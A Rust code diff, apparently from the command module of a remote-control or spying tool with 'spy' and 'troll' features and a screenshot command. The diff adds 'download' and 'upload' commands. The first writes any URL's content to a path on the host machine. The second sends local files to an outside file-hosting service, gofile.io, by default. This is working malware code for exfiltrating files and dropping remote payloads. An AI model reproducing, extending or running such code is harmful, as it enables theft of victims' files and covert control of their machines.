@@ -8,6 +8,10 @@ use crate::data;
 
 #[cfg(feature = "troll")]
 pub use open;
+#[cfg(feature = "troll")]
+use base64::decode;
+#[cfg(feature = "troll")]
+use rodio::{ OutputStream, source::Source };
 
 #[cfg(feature = "spy")]
 use serde::Deserialize;
@@ -20,10 +24,12 @@ use std::io::Cursor;
 #[cfg(feature = "spy")]
 use base64::encode;
 
-#[cfg(feature = "troll")]
-use base64::decode;
-#[cfg(feature = "troll")]
-use rodio::{ OutputStream, source::Source };
+#[cfg(feature = "files")]
+use std::io::Read;
+#[cfg(feature = "files")]
+use std::fs::File;
+#[cfg(feature = "files")]
+use std::io::Write;
 
 #[macro_use]
 pub mod helpers {
@@ -180,5 +186,105 @@ pub fn screenshot(_args: Args, out: OutFun) {
                 text_output!(out, format!("Error writing to buffer: {}", err));
             }
         }
+    }
+}
+
+#[cfg(feature = "files")]
+pub fn download(args: Args, out: OutFun) {
+    if args.len() < 2 {
+        text_output!(out, format!("Please provide a url and target path to download to."));
+        return;
+    }
+
+    let download_url = &args[0];
+    let download_path = &args[1];
+
+    // Perform the actual download using reqwest
+    let response = reqwest::blocking::get(download_url);
+
+    match response {
+        Ok(mut file) => {
+            let mut buffer = Vec::new();
+            match file.read_to_end(&mut buffer) {
+                Ok(_) => {}
+                Err(err) => {
+                    text_output!(out, format!("Error reading download buffer: {}", err));
+                }
+            }
+
+            // Write the downloaded content to the specified path
+            let mut output_file = match File::create(download_path) {
+                Ok(file) => file,
+                Err(err) => {
+                    text_output!(out, format!("Error creating file: {}", err));
+                    return;
+                }
+            };
+            match output_file.write_all(&buffer) {
+                Ok(_) => {}
+                Err(err) => {
+                    text_output!(out, format!("Error writing to {}: {}", download_path, err));
+                    return;
+                }
+            }
+
+            text_output!(out, "Download complete!");
+        }
+        Err(err) => {
+            text_output!(out, format!("Error downloading file: {}", err));
+        }
+    }
+}
+
+#[cfg(feature = "files")]
+pub fn upload(args: Args, out: OutFun) {
+    if args.len() < 1 {
+        text_output!(out, "Please provide a file path to upload.");
+        return;
+    }
+
+    let url: String;
+    let argname: String;
+
+    if args.len() > 2 {
+        let cloned_args = args.clone();
+        url = cloned_args[1].clone();
+        argname = cloned_args[2].clone();
+    } else {
+        url = "https://store1.gofile.io/uploadFile".to_string();
+        argname = "file".to_string();
+    }
+
+    let file_path = &args[0];
+
+    text_output!(out, format!("Uploading file {} to {} within feild {}", file_path, url, argname));
+
+    let form = match reqwest::blocking::multipart::Form::new().file(argname, file_path) {
+        Ok(form) => form,
+        Err(err) => {
+            text_output!(out, format!("Error while creating form: {}", err));
+            return;
+        }
+    };
+
+    let response = match reqwest::blocking::Client::new().post(&url).multipart(form).send() {
+        Ok(res) => res,
+        Err(err) => {
+            text_output!(out, format!("Error getting response from {}: {}", &url, err));
+            return;
+        }
+    };
+
+    if response.status().is_success() {
+        let restext = match response.text() {
+            Ok(text) => text,
+            Err(err) => {
+                text_output!(out, format!("Error parsing response: {}", err));
+                return;
+            }
+        };
+        text_output!(out, format!("File uploaded successfully to: {}", restext));
+    } else {
+        text_output!(out, format!("File upload failed with status: {:?}", response.status()));
     }
 }
